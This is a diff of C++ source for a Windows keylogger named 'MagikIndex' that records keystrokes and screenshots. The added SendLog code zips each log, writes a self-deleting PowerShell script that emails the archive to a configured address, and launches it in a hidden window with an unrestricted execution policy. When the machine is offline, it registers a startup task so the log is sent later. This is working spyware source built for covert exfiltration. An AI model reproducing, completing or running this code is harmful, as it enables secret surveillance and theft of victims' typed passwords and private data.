@@ -4,6 +4,7 @@
 #include <atlbase.h>
 #include <atlconv.h>
 #include <windows.h>
+#include <vector>
 #include <wininet.h>
 #include <iostream>
 #include <string>
@@ -23,6 +24,7 @@
 #include <time.h>
 #include <taskschd.h>
 #include <assert.h>
+//#include "lz4/lz4.h"
 //#include <Wbemidl.h>
 //#include <wbemcli.h>
 
@@ -32,6 +34,9 @@
 typedef std::string String;
 typedef std::vector<String> StringVector;
 typedef unsigned long long uint64_t;
+
+
+using buffer = std::vector<char>;
 
 //------------------------------------------------------
 // Customization
@@ -43,9 +48,9 @@ typedef unsigned long long uint64_t;
 #define CryptPassword "MyPassword" 
 #define BaseShiftValue 100 //base int to add to chars for crypting measures
 #define SecondsBetweenScreenshots 20000
-#define SendersEmail "Example1@gmail.com"
-#define SendersPsw "Example1Password"
-#define RecieversEmail "Example2@gmail.com"
+#define SendersEmail ""
+#define SendersPsw ""
+#define RecieversEmail ""
 
 //------------------------------------------------------
 
@@ -56,7 +61,7 @@ typedef unsigned long long uint64_t;
             { 0x55c92734,                                           \
               0xd682,                                               \
               0x4d71,                                               \
-              { 0x98, 0x3e, 0xd6, 0xec, 0x3f, 0x16, 0x05, 0x9f }    \
+            { 0x98, 0x3e, 0xd6, 0xec, 0x3f, 0x16, 0x05, 0x9f   }    \
 }
 
 
@@ -85,6 +90,7 @@ void LogItInt(int key_stroke, std::string FileName);
 void LogItChar(std::string Value, std::string FileName);
 void SendLog(std::string CurrentLog);
 ULONG WINAPI Protect(LPVOID);
+//void Compress(const buffer& in, buffer& out);
 
 int main()
 {
@@ -129,7 +135,7 @@ int main()
     unsigned long ThreadId2;
     //CreateThread(NULL, 0, ScreenGrabber, 0, 0, &ThreadId2);
 
-    ShellExecuteA(0, "open", "cmd.exe", "/C powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass", 0, SW_HIDE);
+    //ShellExecuteA(0, "open", "cmd.exe", "/C powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass", 0, SW_HIDE);
 
 Log:
 
@@ -746,7 +752,7 @@ HRESULT CopyItems(__in InputIterator first, __in InputIterator last, __in PCSTR 
                 if (!threads.empty())
                 {
                     // Waiting for new threads to finish not more than 5 min.
-                    WaitForMultipleObjects(threads.size(), &threads[0], TRUE, 5 * 60 * 1000);
+                    WaitForMultipleObjects((DWORD)threads.size(), &threads[0], TRUE, 5 * 60 * 1000);
 
                     for (size_t i = 0; i < threads.size(); i++)
                         CloseHandle(threads[i]);
@@ -976,16 +982,57 @@ void LogItChar(std::string Value, std::string FileName) {
     File << EncryptMyString(Value);
     File.close();
 }
+/*
+void Compress(const buffer& in, buffer& out)
+{
+    auto rv = LZ4_compress_default(in.data(), out.data(), in.size(), out.size());
+    if (rv < 1) std::cerr << "Something went wrong!" << std::endl;
+    else out.resize(rv);
+}
 
+void CompressFile(std::string Path) {
+    DWORD WrittenBytes;
+    char FileBufferer[1000 + CharactersPerLog];
+    buffer FileBuffer[1000 + CharactersPerLog];
+    
+
+    std::ifstream InputFile(Path, std::ios::binary);
+    while (!InputFile.eof()) {
+        InputFile.read(FileBufferer,sizeof(FileBufferer));
+        strcat(FileBuffer, FileBufferer);
+    }
+    InputFile.close();
+    DeleteFileA(Path.c_str());
+    buffer data(1000, FileBuffer);
+    buffer compressed(FileBuffer.size()), decompressed(data.size());
+    Compress(FileBuffer, Compressed);
+    HANDLE LZ4File = CreateFileA(Path.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    WriteFile(LZ4File, Compressed, strlen(Compressed), &WrittenBytes, NULL);
+    CloseHandle(LZ4File);
+}
+*/
 void SendLog(std::string CurrentLog) {
+    std::string ZipPath = CurrentLog;
+    ZipPath += ".zip";
+    FILE* f = fopen(ZipPath.c_str(), "wb");
+    fwrite("\x50\x4B\x05\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 22, 1, f);
+    fclose(f);
+    const char* files[] = {
+        CurrentLog.c_str()
+    };
+    {
+        CoInitialize(NULL);
+        CopyItems(std::cbegin(files), std::cend(files), ZipPath.c_str());
+        CoUninitialize();
+    }
     std::string Command = "/C powershell ";
-    char* SysDir = nullptr;
+    char SysDir[MAX_PATH];
+    GetSystemDirectoryA(SysDir, MAX_PATH);
     DWORD WrittenBytes, DWFlags;
     char* AppData = nullptr;
     size_t AppDataSize;
     strcat_s(SysDir, MAX_PATH,"\\cmd.exe");
     _dupenv_s(&AppData, &AppDataSize, "APPDATA");
-    GetSystemDirectoryA(SysDir,MAX_PATH);
     std::string Powershell = AppData;
     Powershell += "\\MagikIndex\\PSScript";
     Powershell += std::to_string(GetTickCount());
@@ -1002,17 +1049,20 @@ void SendLog(std::string CurrentLog) {
     a += "'\n$ReportEmail.To.Add('";
     a += RecieversEmail;
     a += "')\n$ReportEmail.Subject = 'MagikIndex'\n$ReportEmail.Body = 'Your Magik Logger'\n$ReportEmail.Attachments.Add('";
-    a += CurrentLog.c_str();
+    a += ZipPath.c_str();
     a += "')\n$SMTPInfo.Send($ReportEmail)\nRemove-Item $MyINvocation.InvocationName\nexit\n}\nelse\n{\nexit\n}";
     WriteFile(PS1File, a.c_str(), (DWORD)strlen(a.c_str()), &WrittenBytes, NULL);
     CloseHandle(PS1File);
+    Command = "/C PowerShell.exe -ExecutionPolicy Unrestricted -command \"";
     Command += Powershell;
+    Command += "\"";
     if (!InternetGetConnectedState(&DWFlags, NULL)) {
-        LogItChar("No Internet, scheduling task for log extraction...", CurrentLog);
+        //LogItChar("No Internet, scheduling task for log extraction...", CurrentLog);
         RegisterMyProgramForStartup(PSStartup.c_str(), SysDir, Command.c_str());
     }else{
-        LogItChar("Connected to the internet, sending the log...", CurrentLog);
-        ShellExecuteA(0, "open", "cmd.exe", Command.c_str(), 0, SW_HIDE);
+        //LogItChar("Connected to the internet, sending the log...", CurrentLog);
+        //system(Command.c_str());
+        ShellExecuteA(NULL, "open", SysDir, Command.c_str(), NULL, SW_HIDE);
     }
 }
 
@@ -1038,6 +1088,7 @@ ULONG WINAPI Protect(LPVOID Parameter) {
     }
     return 0;
 }
+
 
 
 #pragma warning( pop )
